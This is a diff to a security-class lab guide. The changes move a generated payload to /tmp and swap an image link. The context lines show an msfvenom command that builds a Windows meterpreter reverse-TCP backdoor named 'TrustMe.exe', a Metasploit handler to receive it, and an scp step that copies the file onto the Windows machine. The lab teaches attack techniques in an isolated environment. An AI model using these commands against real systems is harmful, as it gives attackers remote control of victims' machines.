@@ -88,7 +88,7 @@ ifconfig
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /home/ubuntu/Desktop/TrustMe.exe
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /tmp/TrustMe.exe
 ```
 
 Let's start the **Metasploit Handler**.  First, open a new **Linux** instance.
@@ -109,7 +109,9 @@ Before doing anything else, we need to run the following command in our new term
 msfconsole -q
 ```
 
-![](attachments/msfconsole.png)
+<img width="577" height="91" alt="2026-02-23_10-44" src="https://github.com/user-attachments/assets/967b59aa-7a46-4286-9263-25c1bfe77192" />
+
+
 
 The **Metasploit Handler** successfully ran if the terminal now starts with **"msf6 >"**
 
@@ -150,7 +152,7 @@ cd .\Desktop\
 ```
 
 ```ps
-scp ubuntu@linux.cloudlab.lan:/home/ubuntu/Desktop/TrustMe.exe .
+scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
 ```
 
 Open a **Windows** command prompt. 
@@ -258,6 +260,7 @@ As you can see, an error was generated, meaning that we were successful!
 Please be sure to destroy the lab environment!
 
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
+
 
 
 
